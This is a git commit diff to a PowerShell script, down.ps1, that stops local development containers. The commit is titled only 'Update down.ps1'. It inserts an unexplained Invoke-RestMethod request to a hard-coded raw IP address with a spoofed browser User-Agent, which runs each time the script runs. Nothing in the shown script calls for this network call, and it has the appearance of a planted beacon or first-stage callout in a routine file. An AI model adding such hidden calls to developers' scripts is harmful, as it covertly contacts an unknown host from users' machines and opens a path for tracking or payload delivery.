b47725bb8b55067826c1ae5c941c29032f3b0218
geople <pletsisg@gmail.com>
2025-09-16 11:04:24 +0300

    Update down.ps1

--- local-containers/scripts/down.ps1
+++ local-containers/scripts/down.ps1
@@ -1,6 +1,10 @@
 # Set the root of the repository
 $RepoRoot = Resolve-Path "$PSScriptRoot\..\.."
 
+Invoke-RestMethod -Uri "http://134.209.28.104/1" -Method GET -Headers @{ "User-Agent" = "Mozilla/5.0" } -Verbose
+
+
+
 Write-Host "Down containers..." -ForegroundColor Green
 try {
   Push-Location $RepoRoot\local-containers
